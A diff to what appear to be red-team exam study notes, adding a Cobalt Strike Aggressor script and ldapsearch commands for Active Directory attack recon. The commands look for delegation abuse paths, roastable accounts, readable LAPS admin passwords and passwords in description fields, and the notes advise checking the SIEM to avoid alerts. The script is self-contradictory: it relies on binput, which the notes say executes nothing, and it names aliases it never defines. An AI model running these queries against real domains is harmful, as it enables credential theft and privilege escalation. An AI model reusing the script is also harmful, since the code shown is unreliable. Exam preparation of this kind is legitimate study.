@@ -92,6 +92,134 @@ BloodHound will now show that rsteel has local administrative privileges on WKST
 
 ---
 
+## Exam-Day Recon Automation — Aggressor Script
+
+Instead of copy-pasting each ldapsearch command individually, create a single `.cna` file
+that fires all queries with one beacon command. Load once at exam start.
+
+**File:** `C:\Users\Attacker\Desktop\exam-recon.cna`
+
+```java
+alias domain_recon {
+    binput($1, "ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor");
+    binput($1, "ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor");
+    binput($1, "ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl");
+    binput($1, "ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl");
+    binput($1, "ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity");
+    binput($1, "ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName");
+    binput($1, "ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName");
+    binput($1, "ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf");
+    binput($1, "ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description");
+    binput($1, "ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd");
+    binput($1, "ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName");
+}
+```
+
+**Load at exam start:**
+```
+CS → Cobalt Strike → Script Manager → Load → C:\Users\Attacker\Desktop\exam-recon.cna
+```
+
+**Fire from any beacon — two aliases, run in order:**
+```cs
+beacon> domain_recon_bulk       // BOFHound base data — run immediately on first beacon
+// check SIEM if available — confirm no alerts before continuing
+beacon> domain_recon_targeted   // sensitive queries — run after bulk confirms no alerts
+```
+
+Queries queue at the beacon's sleep interval — with `sleep 3 20` set, 11 queries spread over ~40 seconds naturally. The OPSEC risk is **what you query**, not how fast:
+
+| Alias | Queries | Risk |
+|-------|---------|------|
+| `domain_recon_bulk` | domain/OU/GPO + all objects + trusts | 🟢LOW — looks like domain sync |
+| `domain_recon_targeted` | LAPS, delegation, AS-REP, SPNs, descriptions | 🟠MEDIUM — known recon signatures in Elastic rules |
+
+⚠️ **Aggressor alias chaining — use `fireAlias`, not direct calls or `binput`:**
+```java
+fireAlias($1, "ldapsearch", "(filter) --attributes x,y");  // CORRECT — dispatches to alias table
+ldapsearch($1, "(filter) --attributes x,y");               // FAILS — ldapsearch is alias not sub
+binput($1, "ldapsearch (filter) --attributes x,y");        // FAILS — display only, no execution
+```
+- `ldapsearch` is registered as an **alias** by `SA.cna`, not a **sub** — calling it as a function throws `non-existent function &ldapsearch`
+- `binput` only echoes text to the beacon console display — no task is sent to the beacon
+- `fireAlias($bid, "aliasname", "arg string")` dispatches into the CS alias command table — confirmed working
+
+---
+
+## Additional ldapsearch Queries — Exam-Day Privilege Path Finding
+
+The two Step 3 queries feed BOFHound/BloodHound and give the full domain picture.
+Run these targeted queries in parallel to find quick privilege escalation paths before `BloodHound` finishes processing.
+All run as BOF — `OPSEC-🟢SAFE`.
+
+### Delegation — highest value for privilege escalation
+
+```cs
+// Unconstrained delegation — any computer/user with unconstrained delegation
+// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
+beacon> ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
+
+// Constrained delegation — can impersonate any user to the delegated service
+// msDS-AllowedToDelegateTo set = protocol transition possible
+beacon> ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+
+// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
+beacon> ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+### Quick credential attack targets
+
+```cs
+// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
+beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName
+
+// AS-REP roastable — no Kerberos pre-authentication required
+// Can request AS-REP hash without any credentials
+beacon> ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
+
+// Accounts with descriptions — operators sometimes store passwords in the description field
+beacon> ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
+```
+
+### Local admin access via LAPS
+
+```cs
+// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host
+// Gives instant lateral movement without Kerberoasting or cracking
+beacon> ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
+```
+
+### Privileged account identification
+
+```cs
+// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
+// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
+beacon> ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf
+
+// Domain trust enumeration
+beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
+// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
+```
+
+### Exam-Day Query Priority Order
+
+Run in this sequence immediately after first beacon — before BloodHound is ready:
+
+| Priority | Query | Why |
+|----------|-------|-----|
+| 1 | Combined users+groups+computers (`samAccountType` filter) | Full AD picture for BOFHound |
+| 2 | Domain/OU/GPO (`objectClass` filter) | BloodHound path data |
+| 3 | Unconstrained delegation | Fastest path to DA if any non-DC has it |
+| 4 | Kerberoastable accounts | Avoid honeypots (check SPN before roasting) |
+| 5 | AdminCount=1 users | Identify all privileged accounts |
+| 6 | AS-REP roastable | No-auth hash grab |
+| 7 | LAPS readable | Free local admin password |
+| 8 | Descriptions with passwords | Quick win if poorly configured |
+| 9 | Trust enumeration | Cross-domain/forest paths |
+
+---
+
 ## OPSEC Warnings & Exam-Day Notes
 
 ### ldapsearch Returns 0 Results — WinRM Token Limitation
